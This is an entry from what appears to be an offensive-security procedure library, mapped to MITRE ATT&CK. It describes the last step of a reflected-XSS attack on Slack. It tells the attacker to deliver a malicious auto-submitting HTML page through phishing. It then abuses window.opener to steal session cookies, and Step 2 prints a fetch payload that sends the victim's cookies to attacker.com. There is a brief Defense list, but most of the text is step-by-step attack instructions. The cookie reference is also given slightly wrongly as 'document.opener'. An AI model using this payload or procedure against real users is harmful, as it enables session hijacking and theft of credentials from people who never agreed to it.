---
id: proc-uuid-3
tags:
  - xss-trigger
  - window-opener
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.754Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Trigger-Slack-XSS-by-Loading-Malicious-Page

## Summary

This procedure triggers the reflected XSS in Slack by loading the malicious HTML page, causing payload reflection and potential exploitation via window.opener for data theft.

## Description

The final step in the attack chain involves delivering and executing the prepared HTML page in the victim's browser while they are logged into Slack. Upon loading, the auto-submit sends the POST with the malicious 'path', which Slack reflects without sanitization, executing JS in a new tab or redirecting to an attacker site. Without rel='noopener', the new window can access the opener's context (Slack tab), enabling cookie theft via scripts like document.opener.document.cookie. The scenario relies on social engineering for page delivery; outcomes include arbitrary JS execution or session hijacking.

## Requirements

1. Completed HTML file from prior procedures
2. Victim access to the page (e.g., via link)
3. Attacker-controlled server for receiving stolen data if using redirect

## Defense

Defensive measures and detection strategies:

- Implement rel='noopener' on all dynamic links to prevent opener access
- Sanitize reflected parameters to strip javascript: and external URLs
- User education on phishing links; browser warnings for auto-submits

## Objectives

1. Cause reflection of unsanitized 'path' payload
2. Execute JS or redirect exploiting window.opener
3. Steal sensitive data like Slack cookies

## Instructions

### Step 1: Deliver the Page

**Context**: Host or share the HTML to get the victim to load it while in Slack.

Upload 'xss.html' to a web server or send as a file/link via email/phishing.

> Ensure the victim clicks and loads it in their browser authenticated to Slack.

### Step 2: Observe Exploitation

**Context**: Monitor for execution as the form submits and payload reflects.

In a test environment, load the page yourself:

- Alert should fire with cookies if using javascript: payload
- For redirect: New tab opens attacker site, which can script access to opener cookies, e.g., via <script>fetch('https://attacker.com?cookie='+encodeURIComponent(document.opener.document.cookie))</script>

> Verify in dev tools: No rel='noopener' allows cross-window access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-trigger]]
- [[window-opener]]
- [[cookie-theft]]
